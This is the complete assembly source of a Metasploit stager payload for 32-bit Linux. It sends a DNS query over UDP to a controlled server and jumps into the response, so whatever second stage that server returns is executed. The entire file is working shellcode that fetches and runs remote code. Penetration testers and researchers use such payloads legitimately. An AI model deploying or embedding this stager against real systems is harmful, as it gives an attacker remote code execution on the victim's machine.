;;
; 
;        Name: stager_sock_reverse_udp_dns
;   Qualities: Can Have Nulls
;   Platforms: Linux
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        This payload stages by querying a controlled DNS server
;        and jumping into the response record that should contain 
;        the second stage.
;        
;
;;
BITS   32
GLOBAL _start

_start:
	xor  ebx, ebx
	mul  ebx

socket:
	push ebx
	push byte 0x2
	push byte 0x2
	inc  ebx
	mov  al, 0x66
	mov  ecx, esp
	int  0x80
	xchg eax, ebx
	pop  ebp

sendto:
	inc  dl
	push dx               ; class and type (1, 1)
	push dx             
	dec  dl
	push dx
	push dword 0x6d6f6303 ; \x03com
	mov  cl, 0x3
	push ecx              ; q.rr[0].host = non-deterministic
	push edx              ; q.nscount = 0, q.arcount = 0
	inc  dh
	push edx              ; q.qdcount = 1, q.ancount = 0
	mov  dh, 0x4
	push dx               ; q.flags = 0x4 (AA)
	push si               ; q.id = non-deterministic
	mov  esi, esp
	push dword 0x0100007f ; RHOST
	mov  dh, 0x35         ; RPORT (53)
	push dx
	push bp
	mov  edi, esp
	push byte 0x10
	push edi
	cdq
	push edx
	push byte 0x19        ; size of the dns request
	push esi
	push ebx
	mov  ecx, esp
	push byte 0xb
	pop  ebx
	mov  al, 0x66
	int  0x80

read:
	pop  ebx
	mov  dh, 0xc
	mov  al, 0x3
	int  0x80
	add  ecx, byte 0xd
	jmp  ecx
